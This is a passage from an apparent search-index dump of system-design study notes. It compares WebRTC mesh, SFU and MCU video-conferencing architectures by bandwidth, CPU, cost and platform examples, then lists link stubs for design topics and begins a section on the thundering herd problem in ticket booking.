\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n\nSTEP 5: DISTRIBUTE\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n    \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n    \u2551  MCU - Send                       \u2551\n    \u2551                                   \u2551\n    \u2551  Same stream to all participants  \u2551\n    \u2551         \u2193         \u2193         \u2193     \u2551\n    \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2566\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2566\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2566\u2550\u2550\u2550\u2550\u2550\u255d\n              \u2502         \u2502         \u2502\n         \u250c\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2510 \u250c\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2510 \u250c\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2510\n         \u2502Alice  \u2502 \u2502 Bob   \u2502 \u2502 Charlie\u2502\n         \u2502       \u2502 \u2502       \u2502 \u2502        \u2502\n         \u2502Decode \u2502 \u2502Decode \u2502 \u2502 Decode \u2502\n         \u2502   +   \u2502 \u2502   +   \u2502 \u2502   +    \u2502\n         \u2502Display\u2502 \u2502Display\u2502 \u2502Display \u2502\n         \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nCPU USAGE COMPARISON:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nP2P (4 users):\n\u251c\u2500 Each user encodes: 3 times\n\u251c\u2500 Each user decodes: 3 times\n\u2514\u2500 Total: 12 encode + 12 decode operations\n\nSFU (4 users):\n\u251c\u2500 Each user encodes: 1 time\n\u251c\u2500 Each user decodes: 3 times\n\u251c\u2500 SFU: 0 encode, 0 decode (just forwards)\n\u2514\u2500 Total: 4 encode + 12 decode operations\n\nMCU (4 users):\n\u251c\u2500 Each user encodes: 1 time\n\u251c\u2500 Each user decodes: 1 time\n\u251c\u2500 MCU: 4 decode + 1 encode\n\u2514\u2500 Total: 5 encode + 8 decode operations\n    But MCU handles heavy lifting on server!\n</code></pre>"},{"location":"system-design/high-level/concepts/webrtc/#advantages_2","title":"Advantages","text":"<pre><code>\u2705 BENEFITS:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n1. ULTRA-EFFICIENT CLIENT BANDWIDTH\n   \u2022 Upload: 1 stream (2 Mbps)\n   \u2022 Download: 1 stream (2 Mbps)\n   \u2022 Total: 4 Mbps (same for 10 or 100 people!)\n   \u2022 Perfect for poor connections\n   \u2022 Great for mobile devices\n\n2. MINIMAL CLIENT CPU\n   \u2022 Encode once\n   \u2022 Decode once\n   \u2022 No matter how many participants\n   \u2022 Excellent battery life\n   \u2022 Works on very low-end devices\n\n3. CONSISTENT QUALITY\n   \u2022 Everyone sees same quality\n   \u2022 No variation between users\n   \u2022 Predictable experience\n   \u2022 Professional appearance\n\n4. ADVANCED FEATURES\n   \u2022 Custom layouts (grid, spotlight, picture-in-picture)\n   \u2022 Active speaker detection\n   \u2022 Screen share layouts\n   \u2022 Branding/overlays\n   \u2022 Real-time effects\n   \u2022 Background replacement (server-side)\n\n5. BUILT-IN RECORDING\n   \u2022 Easy to record\n   \u2022 One stream to capture\n   \u2022 No post-processing needed\n   \u2022 Single video file output\n\n6. WORKS ON TERRIBLE NETWORKS\n   \u2022 Low bandwidth requirements\n   \u2022 2-4 Mbps sufficient\n   \u2022 2G/3G compatible\n   \u2022 Dial-in phone integration possible\n\n7. CONTROL &amp; MODERATION\n   \u2022 Server controls who sees what\n   \u2022 Easy to mute/remove participants\n   \u2022 Layout control\n   \u2022 Recording/compliance\n</code></pre>"},{"location":"system-design/high-level/concepts/webrtc/#disadvantages_2","title":"Disadvantages","text":"<pre><code>\u274c LIMITATIONS:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n1. EXTREMELY CPU INTENSIVE\n   \u2022 Must decode ALL incoming streams\n   \u2022 Must encode output stream\n   \u2022 100 participants = decode 100 + encode 1\n   \u2022 Requires powerful servers\n   \u2022 High cooling/power costs\n\n2. HIGH INFRASTRUCTURE COSTS\n   \u2022 Expensive hardware (GPUs often needed)\n   \u2022 High operational costs\n   \u2022 Complex to maintain\n   \u2022 Doesn't scale horizontally easily\n\n3. HIGHER LATENCY\n   \u2022 Decode \u2192 Compose \u2192 Encode pipeline\n   \u2022 Typical latency: 200-500ms\n   \u2022 Not suitable for real-time interaction\n   \u2022 Noticeable delay in conversations\n\n4. SINGLE POINT OF FAILURE\n   \u2022 If MCU fails, entire call fails\n   \u2022 Difficult to load balance\n   \u2022 Complex failover\n\n5. FIXED LAYOUT\n   \u2022 Everyone sees same view\n   \u2022 Can't personalize\n   \u2022 Can't see all participants in large calls\n   \u2022 Limited flexibility\n\n6. QUALITY BOTTLENECK\n   \u2022 Limited by MCU's encoding quality\n   \u2022 Can't deliver higher than MCU output\n   \u2022 1080p limit common\n   \u2022 Original quality lost (transcoding)\n\n7. SCALING IS EXPENSIVE\n   \u2022 Linear cost per participant\n   \u2022 Can't easily add servers\n   \u2022 Each MCU handles full processing\n   \u2022 Very expensive for large calls\n\nCPU COST EXAMPLE (10 participants):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nDecode 10 streams:  10 CPU cores\nCompose:            2 CPU cores\nEncode 1 stream:    2 CPU cores\nTotal:              14 CPU cores\n\nvs SFU:             0 CPU cores (forwarding only)\nvs P2P:             0 server cost\n</code></pre>"},{"location":"system-design/high-level/concepts/webrtc/#use-cases_2","title":"Use Cases","text":"<pre><code>\u2705 IDEAL FOR:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2022 Webinars (presenter + many viewers)\n\u2022 Online classes (teacher + students)\n\u2022 Broadcasting to large audiences\n\u2022 Corporate town halls\n\u2022 Dial-in phone participants\n\u2022 Very poor network environments (2G/3G)\n\u2022 Regulated industries (recording/compliance)\n\u2022 Professional broadcasts\n\n\u2705 WHEN TO USE:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2022 Need consistent quality for all\n\u2022 Recording is essential\n\u2022 Many participants with poor connections\n\u2022 Custom branded layouts required\n\u2022 Budget for server infrastructure\n\u2022 Latency &lt;500ms is acceptable\n</code></pre>"},{"location":"system-design/high-level/concepts/webrtc/#comparison-webrtc-vs-sfu-vs-mcu","title":"Comparison: WebRTC vs SFU vs MCU","text":""},{"location":"system-design/high-level/concepts/webrtc/#architecture-comparison","title":"Architecture Comparison","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502               Architecture Comparison                        \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nPEER-TO-PEER (WebRTC Mesh):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nU1 \u25c0\u2500\u2500\u25b6 U2\n \u25c0\u2500\u2500\u2500X\u2500\u2500\u2500\u25b6\n \u2502       \u2502\nU3 \u25c0\u2500\u2500\u25b6 U4\n\nCharacteristics:\n\u2022 Direct connections\n\u2022 No server\n\u2022 Fully distributed\n\n\nSFU (Selective Forwarding Unit):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nU1 \u2500\u2500\u25b6 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2500\u2500\u25b6 U2, U3, U4\nU2 \u2500\u2500\u25b6 \u2502  SFU  \u2502 \u2500\u2500\u25b6 U1, U3, U4\nU3 \u2500\u2500\u25b6 \u2502Forward\u2502 \u2500\u2500\u25b6 U1, U2, U4\nU4 \u2500\u2500\u25b6 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2500\u2500\u25b6 U1, U2, U3\n\nCharacteristics:\n\u2022 Centralized routing\n\u2022 No transcoding\n\u2022 Fast forwarding\n\n\nMCU (Multipoint Control Unit):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nU1 \u2500\u2500\u25b6 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\nU2 \u2500\u2500\u25b6 \u2502    MCU    \u2502\nU3 \u2500\u2500\u25b6 \u2502  Decode   \u2502\nU4 \u2500\u2500\u25b6 \u2502  Compose  \u2502 \u2500\u2500\u25b6 Composite \u2500\u2500\u25b6 All users\n       \u2502  Encode   \u2502\n       \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nCharacteristics:\n\u2022 Centralized processing\n\u2022 Full transcoding\n\u2022 Single output\n</code></pre>"},{"location":"system-design/high-level/concepts/webrtc/#feature-comparison-table","title":"Feature Comparison Table","text":"Feature P2P (Mesh) SFU MCU Max Participants 2-4 50-100+ 100-1000+ Client Upload BW High (N-1 streams) Low (1 stream) Low (1 stream) Client Download BW High (N-1 streams) High (N-1 streams) Very Low (1 stream) Client CPU Very High Medium Very Low Server CPU None Very Low Very High Server Cost $0 $$ $$$$ Latency 20-50ms 50-150ms 200-500ms Quality Best Good Medium Scalability \u274c Poor \u2705 Good \u26a0\ufe0f Expensive Bandwidth Efficiency \u274c Poor \u26a0\ufe0f Medium \u2705 Excellent Recording Hard Medium Easy Custom Layouts No No Yes Works on Mobile 2-3 users Yes Yes (best) Works on Poor Network No Medium \u2705 Best"},{"location":"system-design/high-level/concepts/webrtc/#bandwidth-comparison-10-participants-2-mbps-per-stream","title":"Bandwidth Comparison (10 Participants, 2 Mbps per stream)","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502          Bandwidth Usage Comparison (10 Users)               \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nPER USER:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nP2P Mesh:\n\u251c\u2500 Upload: 9 streams \u00d7 2 Mbps = 18 Mbps \u274c Too high!\n\u251c\u2500 Download: 9 streams \u00d7 2 Mbps = 18 Mbps\n\u2514\u2500 Total: 36 Mbps per user\n\nSFU:\n\u251c\u2500 Upload: 1 stream \u00d7 2 Mbps = 2 Mbps \u2713\n\u251c\u2500 Download: 9 streams \u00d7 2 Mbps = 18 Mbps \u26a0\ufe0f\n\u2514\u2500 Total: 20 Mbps per user\n\nMCU:\n\u251c\u2500 Upload: 1 stream \u00d7 2 Mbps = 2 Mbps \u2713\n\u251c\u2500 Download: 1 composite \u00d7 2 Mbps = 2 Mbps \u2713\u2713\n\u2514\u2500 Total: 4 Mbps per user \u2705 Best!\n\n\nSERVER:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nP2P Mesh:\n\u2514\u2500 Server bandwidth: 0 (no server)\n\nSFU:\n\u251c\u2500 Receive: 10 streams \u00d7 2 Mbps = 20 Mbps\n\u251c\u2500 Send: 10 streams \u00d7 9 recipients = 180 Mbps\n\u2514\u2500 Total: 200 Mbps\n\nMCU:\n\u251c\u2500 Receive: 10 streams \u00d7 2 Mbps = 20 Mbps\n\u251c\u2500 Send: 1 composite \u00d7 10 recipients = 20 Mbps\n\u2514\u2500 Total: 40 Mbps \u2705 Efficient\n\n\nTOTAL NETWORK TRAFFIC:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nP2P: 10 users \u00d7 36 Mbps = 360 Mbps total\nSFU: 200 Mbps server + (10 \u00d7 2 uploads) = 220 Mbps\nMCU: 40 Mbps server + (10 \u00d7 2 uploads) = 60 Mbps \u2705 Lowest\n</code></pre>"},{"location":"system-design/high-level/concepts/webrtc/#cost-comparison-100-participants","title":"Cost Comparison (100 Participants)","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502              Monthly Cost Estimation (100 users)             \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nP2P (Peer-to-Peer):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nServer Costs: $0\nSTUN/TURN: $50-100/month\nTotal: ~$100/month\n\n\u274c But doesn't work! (Can't handle 100 users)\n\n\nSFU (Selective Forwarding Unit):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nServer Instances: 5 \u00d7 $200 = $1,000\nBandwidth: 50 TB \u00d7 $10/TB = $500\nTotal: ~$1,500/month\n\n\u2705 Scales well, reasonable cost\n\n\nMCU (Multipoint Control Unit):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nGPU Servers: 10 \u00d7 $500 = $5,000\nBandwidth: 10 TB \u00d7 $10/TB = $100\nTotal: ~$5,100/month\n\n\u26a0\ufe0f Expensive but best quality\n</code></pre>"},{"location":"system-design/high-level/concepts/webrtc/#when-to-use-each-architecture","title":"When to Use Each Architecture","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                  Decision Matrix                             \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nUSE P2P (WebRTC Mesh) WHEN:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2713 Only 1-on-1 or max 4 people\n\u2713 Want zero server costs\n\u2713 Need lowest possible latency\n\u2713 Privacy is critical (no server)\n\u2713 Simple use case\n\nExamples: FaceTime, WhatsApp video (1-on-1), peer file sharing\n\n\nUSE SFU WHEN:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2713 Group calls (4-100 people) \u2190 Most common!\n\u2713 Need low latency (&lt;200ms)\n\u2713 Interactive communication\n\u2713 Users need to see each other\n\u2713 Quality can vary per user\n\u2713 Reasonable budget\n\nExamples: Zoom, Google Meet, Microsoft Teams, Discord\n\n\nUSE MCU WHEN:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2713 Large webinars (100+ viewers)\n\u2713 Broadcasting/streaming\n\u2713 Very poor client connections\n\u2713 Need professional layouts\n\u2713 Recording is essential\n\u2713 Compliance requirements\n\u2713 Budget for infrastructure\n\u2713 Latency &lt;500ms acceptable\n\nExamples: Cisco Webex, professional broadcasts, online classes\n\n\nHYBRID APPROACHES:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nMany modern platforms use combinations:\n\n1. SFU + Active Speaker Layout:\n   \u2514\u2500 SFU forwards streams\n   \u2514\u2500 Client shows only active speaker + thumbnails\n   \u2514\u2500 Reduces decode load\n\n2. SFU + MCU fallback:\n   \u2514\u2500 SFU for most users\n   \u2514\u2500 MCU for dial-in phone participants\n   \u2514\u2500 Best of both worlds\n\n3. Cascading SFUs:\n   \u2514\u2500 Multiple SFUs in different regions\n   \u2514\u2500 Reduce latency globally\n   \u2514\u2500 Better scalability\n</code></pre>"},{"location":"system-design/high-level/concepts/webrtc/#real-world-examples","title":"Real-World Examples","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502            Real-World Platform Architectures                 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nZOOM:\n\u2500\u2500\u2500\u2500\u2500\nPrimary: SFU\nFeatures:\n\u2022 Up to 1,000 participants (SFU)\n\u2022 Gallery view: SFU sends all streams\n\u2022 Active speaker view: Optimized SFU\n\u2022 Recording: MCU component\n\u2022 Phone dial-in: MCU gateway\n\nArchitecture: Hybrid SFU + MCU\n\n\nGOOGLE MEET:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nPrimary: SFU\nFeatures:\n\u2022 Up to 250 participants\n\u2022 Simulcast for quality adaptation\n\u2022 AI-powered active speaker detection\n\u2022 Low latency mode\n\nArchitecture: Pure SFU with smart routing\n\n\nMICROSOFT TEAMS:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nPrimary: SFU with MCU fallback\nFeatures:\n\u2022 SFU for modern clients\n\u2022 MCU for legacy/phone participants\n\u2022 Together mode (MCU-composed view)\n\u2022 Recording uses MCU\n\nArchitecture: Hybrid\n\n\nDISCORD:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nPrimary: SFU\nFeatures:\n\u2022 Voice channels: P2P (small groups)\n\u2022 Video: SFU (larger groups)\n\u2022 Go Live streaming: SFU\n\u2022 Very low latency focus\n\nArchitecture: P2P \u2192 SFU based on size\n\n\nWHATSAPP:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nPrimary: P2P\nFeatures:\n\u2022 1-on-1: Direct P2P\n\u2022 Group calls (2-8): P2P Mesh\n\u2022 Max 8 participants\n\u2022 End-to-end encrypted\n\nArchitecture: Pure P2P (limited scale)\n\n\nFACETIME:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nPrimary: P2P \u2192 SFU\nFeatures:\n\u2022 1-on-1: P2P\n\u2022 Group (3+): Apple's SFU servers\n\u2022 Up to 32 participants\n\u2022 Low latency\n\nArchitecture: Hybrid P2P/SFU\n</code></pre>"},{"location":"system-design/high-level/concepts/webrtc/#summary-best-practices","title":"Summary &amp; Best Practices","text":"<pre><code>KEY TAKEAWAYS:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n1. P2P (WebRTC Mesh):\n   \u2705 Best for: 1-on-1 calls\n   \u274c Don't use for: &gt;4 participants\n\n2. SFU (Selective Forwarding Unit):\n   \u2705 Best for: Group video calls (4-100)\n   \u2705 Sweet spot: Interactive communication\n   \u274c High client download bandwidth\n\n3. MCU (Multipoint Control Unit):\n   \u2705 Best for: Webinars, broadcasts, poor networks\n   \u2705 Ultra-efficient for clients\n   \u274c Expensive servers, higher latency\n\n\nMODERN BEST PRACTICE:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nStart with SFU, add optimizations:\n\n1. Simulcast: Multiple quality layers\n2. Active Speaker: Highlight main speaker\n3. Thumbnail view: Low quality for non-speakers\n4. Adaptive bitrate: Adjust to network\n5. Screen share priority: Boost presentation quality\n6. Spatial audio: Better audio experience\n\nThis gives 95% of users great experience\nat reasonable cost!\n\n\nSCALING STRATEGY:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nSmall (2-4):     P2P\nMedium (5-50):   SFU\nLarge (50-100):  SFU + optimizations\nHuge (100+):     SFU + MCU hybrid\nBroadcast:       MCU or CDN streaming\n</code></pre>"},{"location":"system-design/high-level/desgining/Image-Optimisation-on-the-fly/","title":"Image Optimisation on the fly (Cloudinary)","text":""},{"location":"system-design/high-level/desgining/Image-Optimisation-on-the-fly/#youtube","title":"Youtube","text":"<ul> <li>Build your own Cloudinary - Image Optimisation on the fly</li> </ul>"},{"location":"system-design/high-level/desgining/Image-Optimisation-on-the-fly/#blogs","title":"Blogs","text":"<ul> <li>Image Optimization using Amazon CloudFront and AWS Lambda</li> <li>aws-samples/image-optimization</li> </ul>"},{"location":"system-design/high-level/desgining/app-store/","title":"Design an App Store (Apple Store/Google Playstore)","text":""},{"location":"system-design/high-level/desgining/app-store/#youtube","title":"Youtube","text":"<ul> <li>Design a Faster App Store | System Design</li> </ul>"},{"location":"system-design/high-level/desgining/authentication-system/","title":"Design An Authentication System","text":""},{"location":"system-design/high-level/desgining/authentication-system/#youtube","title":"Youtube","text":"<ul> <li>Design a Simple Authentication System | System Design Interview Prep</li> </ul>"},{"location":"system-design/high-level/desgining/bookmyshow/","title":"Design Book My Show","text":""},{"location":"system-design/high-level/desgining/bookmyshow/#youtube","title":"Youtube","text":"<ul> <li>27. Thundering Herd Effect on Ticket Booking App | System Design</li> </ul>"},{"location":"system-design/high-level/desgining/bookmyshow/#theory","title":"Theory","text":""},{"location":"system-design/high-level/desgining/bookmyshow/#thundering-herd-effect","title":"Thundering Herd Effect","text":""},{"location":"system-design/high-level/desgining/bookmyshow/#description","title":"Description","text":"<p>The Thundering Herd Effect is a problem that occurs when a large number of processes or threads waiting for an event are awakened simultaneously when that event occurs, but only one or a few can proceed. In the context of ticket booking systems like BookMyShow, this happens when:</p> <ol> <li>High-demand events: When tickets for a popular movie/concert go on sale, thousands of users try to book simultaneously</li> <li>Cache expiration: When cached data expires, multiple requests simultaneously try to regenerate it</li> <li>Resource locking: Multiple requests compete for the same limited resources (seats, payment processing)</li> </ol> <p>Problems caused by Thundering Herd: - Server overload: Sudden spike in requests can crash the server - Database strain: Concurrent writes/reads overwhelm the database - Poor user experience: Legitimate users face timeouts and errors - Resource waste: System spends resources processing requests that will ultimately fail - Cascade failures: Overload in one component can trigger failures in others</p> <p>Real-world example in BookMyShow: When tickets for a blockbuster movie open at 12:00 PM: - 10,000 users click \"Book Now\" at exactly 12:00:00 - All requests hit the server simultaneously - Database gets flooded with concurrent seat availability checks - Lock contention on the same seats causes delays - Most users get timeout errors even though seats are available</p>"},{"location":"system-design/high-level/desgining/bookmyshow/#diagram","title":"Diagram","text":"<pre><code>Without Mitigation:\n==================\n\nTime: 12:00:00 PM (Ticket Sales Open)\n\n  User\u2081 \u2500\u2500\u2510                         \n  User\u2082 \u2500\u2500\u2524                         \n  User\u2083 \u2500\u2500\u2524                         \n  User\u2084 \u2500\u2500\u2524                         \n  User\u2085 \u2500\u2500\u253c\u2500\u2500\u25ba Server \u2500\u2500\u25ba Database\n  User\u2086 \u2500\u2500\u2524       \u2193           \u2193\n  User\u2087 \u2500\u2500\u2524    OVERLOAD    DEADLOCK\n  User\u2088 \u2500\u2500\u2524       \u2193           \u2193\n  User\u2089 \u2500\u2500\u2524    CRASH      TIMEOUTS\n  User\u2081\u2080 \u2500\u2518                         \n\nResult: \ud83d\udca5 System Failure\n\n\nWith Exponential Backoff + Jitter:\n==================================\n\nTime: 12:00:00 - 12:00:05 PM\n\n  User\u2081 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502\n  User\u2082 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba               \u2502\n  User\u2083 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba         \u2502  Requests spread\n  User\u2084 \u2500\u2500\u2500\u2500\u25ba                   \u2502  over time window\n  User\u2085 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba \u2502  (0-5 seconds)\n  User\u2086 